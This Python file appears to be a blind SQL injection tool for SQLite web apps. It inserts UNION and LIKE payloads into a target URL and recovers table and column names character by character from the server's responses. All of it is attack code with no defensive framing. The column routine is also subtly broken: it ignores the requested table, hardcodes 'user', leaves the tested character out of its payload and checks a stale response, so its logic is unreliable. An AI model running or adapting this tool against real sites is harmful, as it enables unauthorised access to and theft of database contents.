from requests import request
from sys import exit


CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_'


class Sqlite_Enumerator():
    def enumerate_table(self, opts, poison):
        nulls = "".join([",null" for _ in range(0, opts.COLUMNS - 1)])
        table_poison = "SELECT name" + nulls + \
            " FROM sqlite_master WHERE type='table' AND name LIKE '"

        known_tables = []
        known_chars = ""
        verified = False
        while not verified:
            iteration_interrupted = False
            for char in CHARS:
                poison_str = poison + table_poison + known_chars + char + "%'"
                if len(known_tables) > 0:
                    poison_str += "".join([" AND name != '" +
                                          e + "'" for e in known_tables])

                poison_str += ";--"

                poison_url = opts.URL.replace("FUZZ", poison_str)
                response = request("get", poison_url)
                response = response.text

                if opts.SUCCESS_STR in response and opts.ERROR_STR in response:
                    print(
                        '[x] Response reading ambiguous, try specifying response strings')
                    exit(1)
                elif opts.SUCCESS_STR in response:
                    known_chars += char
                    iteration_interrupted = True
                    break

            if not iteration_interrupted and known_chars != "":
                known_tables.append(known_chars)
                known_chars = ""
            elif not iteration_interrupted:
                return known_tables

    def enumerate_columns(self, opts, poison, table_name):
        column_poison = "SELECT p.name FROM sqlite_master AS m JOIN pragma_table_info('user') AS p WHERE m.type='table' AND p.name LIKE '"

        known_chars = ""
        verified = False
        while not verified:
            for char in CHARS:
                poison_str = poison + column_poison + known_chars + "%';--"
                poison_url = opts.URL.replace("FUZZ", poison_str)
                response = request("get", poison_url)
                response = response.text

                if opts.SUCCESS_STR in response and opts.ERROR_STR in response:
                    print(
                        '[x] Response reading ambiguous, try specifying response strings')
                    exit(1)
                elif opts.SUCCESS_STR in response:
                    known_chars += char
                    break

            verify_poison = column_poison.replace("LIKE ", "= ", 1)
            verify_url = opts.URL.replace(
                "FUZZ", poison + verify_poison + known_chars + "';--")
            verify_response = request("get", verify_url)
            verify_response = verify_response.text

            if opts.SUCCESS_STR in response and opts.ERROR_STR in response:
                print(
                    '[x] Response reading ambiguous, try specifying response strings')
                exit(1)
            elif opts.SUCCESS_STR in response:
                verified = True
